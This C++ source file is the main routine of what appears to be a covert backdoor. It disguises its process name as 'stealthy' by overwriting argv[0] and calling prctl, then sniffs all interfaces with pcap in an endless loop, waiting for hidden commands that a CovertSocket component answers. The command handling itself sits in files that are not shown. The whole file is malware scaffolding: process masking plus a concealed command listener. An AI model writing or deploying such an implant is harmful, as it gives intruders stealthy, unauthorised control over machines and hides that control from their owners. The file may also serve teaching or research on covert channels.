#include <iostream>
#include <cstring>
#include <sys/prctl.h>
#include <signal.h>
#include <csignal>
#include <pcap.h>
#include "NetworkMonitor.h"
#include "CovertSocket.h"
#include "../utils/Logger.h"


pcap_if_t * allInterfaces = nullptr;
pcap_if_t * listeningInterface = nullptr;

bool keepListening = true;

void shutdownServer(int signo){
    cout << "Terminating Program" << endl;

    keepListening = false;

    pcap_freealldevs(allInterfaces);
    allInterfaces = nullptr;
    listeningInterface = nullptr;

}

bool getInterface(){

    Logger::debug("Main:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("Main:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

int main(int argc, char * argv[]) {

    Logger::setDebug(true);

    Logger::debug("Starting Program");

    //mask the program
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], "stealthy");
    prctl(PR_SET_NAME, "stealthy", 0,0);

    Logger::debug("Masking Complete");

    //register listening for kill commands. when killed we destroy ourselves
    struct sigaction act;
    act.sa_handler = shutdownServer;
    act.sa_flags = 0;
    if(sigemptyset(&act.sa_mask) == -1 || sigaction(SIGINT, &act, NULL) == -1){
        perror("Failed to Set SIGNINT Handler");
        return 1;
    }

    Logger::debug("Registering Signal");

    //find listening items
    if(getInterface() == false){
        Logger::error("Main - There was An Error Reading The Interfaces");
        return 1;
    }else{
        Logger::debug("Finding Interface Successful");
    }

    Logger::debug("Finding Interfaces");


    TrafficAnalyzer * trafficAnalyzer = new TrafficAnalyzer();
    //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
    CovertSocket * socket = new CovertSocket(trafficAnalyzer); //how we respond to commands
    NetworkMonitor * monitor = new NetworkMonitor(trafficAnalyzer); //how we listen for commands
    while(keepListening){

        monitor->listenForTraffic(); //this will hang until a single unit of data is received and then return it


    }

    Logger::debug("Loop Killed. Terminating");
    return 0;
}